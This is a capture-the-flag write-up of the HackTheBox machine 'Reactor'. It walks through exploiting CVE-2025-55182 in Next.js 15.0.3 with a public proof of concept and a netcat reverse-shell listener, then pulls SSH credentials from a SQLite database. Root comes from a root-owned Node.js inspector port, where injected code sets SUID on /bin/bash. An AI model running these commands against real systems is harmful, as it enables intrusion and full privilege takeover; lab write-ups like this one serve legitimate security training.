Reactor

HackTheBox · Easy by Brenno M.

Reactor exploits an unauthenticated RCE in Next.js 15.0.3 (CVE-2025-55182, nicknamed "React2Shell") and, in the escalation phase, abuses a root-owned Node.js process exposed with --inspect, whose debug protocol is equivalent to code execution as root.

Reconnaissance

Nmap reveals SSH (22) and a web app on port 3000. Fingerprinting identifies a Next.js 15.0.3 app ("ReactorWatch Core").

sudo rustscan -a <IP> -- -sS -sV -Pn
# 22/tcp ssh, 3000/tcp http (Next.js 15.0.3)

Exploitation - CVE-2025-55182

Next.js 15.0.3 insufficiently validates React Server Components payloads, allowing command injection. Use the public PoC to trigger a reverse shell as the node user.

git clone https://github.com/msanft/CVE-2025-55182
nc -lvnp 4444
python3 exploit.py --target http://<IP>:3000 --lhost <MY_IP> --lport 4444

On the foothold, the SQLite database /opt/reactor-app/reactor.db holds the users table, the credentials grant SSH access to a low-privileged user.

sqlite3 /opt/reactor-app/reactor.db '.tables'
# users -> credentials for SSH

Escalation - Node.js Inspector

Root runs a Node.js process with --inspect=127.0.0.1:9229. The Chrome DevTools Protocol on that socket lets us evaluate arbitrary JavaScript inside the root process. We forward the port over SSH and inject code that sets SUID on bash.

ssh -L 9229:127.0.0.1:9229 user@<IP>
# via CDP on the local inspector -> run as root:
# require('child_process').execSync('chmod +s /bin/bash')
/bin/bash -p
cat /root/root.txt
